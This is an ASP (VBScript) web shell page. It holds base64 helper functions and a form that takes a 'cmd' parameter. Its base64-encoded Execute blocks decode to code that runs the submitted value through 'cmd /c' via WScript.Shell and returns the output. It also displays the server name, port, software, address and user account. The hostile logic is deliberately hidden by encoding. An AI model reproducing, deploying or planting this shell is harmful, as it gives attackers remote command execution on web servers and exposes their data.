<%
Function Base64Encode(sText)
    Dim oXML, oNode
    Set oXML = CreateObject("Msxml2.DOMDocument.3.0")
    Set oNode = oXML.CreateElement("base64")
    oNode.dataType = "bin.base64"
    oNode.nodeTypedValue = Stream_StringToBinary(sText)
    Base64Encode = oNode.text
    Set oNode = Nothing
    Set oXML = Nothing
End Function
Function Base64Decode(ByVal vCode)
    Dim oXML, oNode
    Set oXML = CreateObject("Msxml2.DOMDocument.3.0")
    Set oNode = oXML.CreateElement("base64")
    oNode.dataType = "bin.base64"
    oNode.text = vCode
    Base64Decode = Stream_BinaryToString(oNode.nodeTypedValue)
    Set oNode = Nothing
    Set oXML = Nothing
End Function
Private Function Stream_StringToBinary(Text)
  Const adTypeText = 2
  Const adTypeBinary = 1
  Dim BinaryStream 'As New Stream
  Set BinaryStream = CreateObject("ADODB.Stream")
  BinaryStream.Type = adTypeText
  BinaryStream.CharSet = "us-ascii"
  BinaryStream.Open
  BinaryStream.WriteText Text
  BinaryStream.Position = 0
  BinaryStream.Type = adTypeBinary
  BinaryStream.Position = 0
  Stream_StringToBinary = BinaryStream.Read
  Set BinaryStream = Nothing
End Function
Private Function Stream_BinaryToString(Binary)
  Const adTypeText = 2
  Const adTypeBinary = 1
  Dim BinaryStream 'As New Stream
  Set BinaryStream = CreateObject("ADODB.Stream")
  BinaryStream.Type = adTypeBinary
  BinaryStream.Open
  BinaryStream.Write Binary
  BinaryStream.Position = 0
  BinaryStream.Type = adTypeText
  BinaryStream.CharSet = "us-ascii"
  Stream_BinaryToString = BinaryStream.ReadText
  Set BinaryStream = Nothing
End Function
%>

<%=Execute(Base64Decode("U2V0IG9TY3JpcHQgPSBTZXJ2ZXIuQ3JlYXRlT2JqZWN0KCJXU0NSSVBULlNIRUxMIikKU2V0IG9TY3JpcHROZXQgPSBTZXJ2ZXIuQ3JlYXRlT2JqZWN0KCJXU0NSSVBULk5FVFdPUksiKQpTZXQgb0ZpbGVTeXMgPSBTZXJ2ZXIuQ3JlYXRlT2JqZWN0KCJTY3JpcHRpbmcuRmlsZVN5c3RlbU9iamVjdCIpCkZ1bmN0aW9uIGdldENvbW1hbmRPdXRwdXQodGhlQ29tbWFuZCkKICAgIERpbSBvYmpTaGVsbCwgb2JqQ21kRXhlYwogICAgU2V0IG9ialNoZWxsID0gQ3JlYXRlT2JqZWN0KCJXU2NyaXB0LlNoZWxsIikKICAgIFNldCBvYmpDbWRFeGVjID0gb2Jqc2hlbGwuZXhlYyh0aGVjb21tYW5kKQogICAgZ2V0Q29tbWFuZE91dHB1dCA9IG9iakNtZEV4ZWMuU3RkT3V0LlJlYWRBbGwKZW5kIEZ1bmN0aW9u"))%>


<HTML>
<BODY>
<FORM action="" method="GET">
<input type="text" name="cmd" size=45 value="<%= szCMD %>">
<input type="submit" value="Run">
</FORM>
<PRE>
<%= "\\" & oScriptNet.ComputerName & "\" & oScriptNet.UserName %>
<%=Execute(Base64Decode("UmVzcG9uc2UuV3JpdGUoUmVxdWVzdC5TZXJ2ZXJWYXJpYWJsZXMoInNlcnZlcl9uYW1lIikp"))%>
<p>
<b>The server's port:</b>
<%=Execute(Base64Decode("UmVzcG9uc2UuV3JpdGUoUmVxdWVzdC5TZXJ2ZXJWYXJpYWJsZXMoInNlcnZlcl9wb3J0Iikp"))%>
</p>
<p>
<b>The server's software:</b>
<%=Execute(Base64Decode("UmVzcG9uc2UuV3JpdGUoUmVxdWVzdC5TZXJ2ZXJWYXJpYWJsZXMoInNlcnZlcl9zb2Z0d2FyZSIpKQ=="))%>
</p>
<p>
<b>The server's software:</b>
<%=Execute(Base64Decode("UmVzcG9uc2UuV3JpdGUoUmVxdWVzdC5TZXJ2ZXJWYXJpYWJsZXMoIkxPQ0FMX0FERFIiKSk="))%>
<%=Execute(Base64Decode("c3pDTUQgPSByZXF1ZXN0KCJjbWQiKQp0aGlzRGlyID0gZ2V0Q29tbWFuZE91dHB1dCgiY21kIC9jIiAmIHN6Q01EKQpSZXNwb25zZS5Xcml0ZSh0aGlzRGlyKQ=="))%>
</p>
<br>
</BODY>
</HTML>

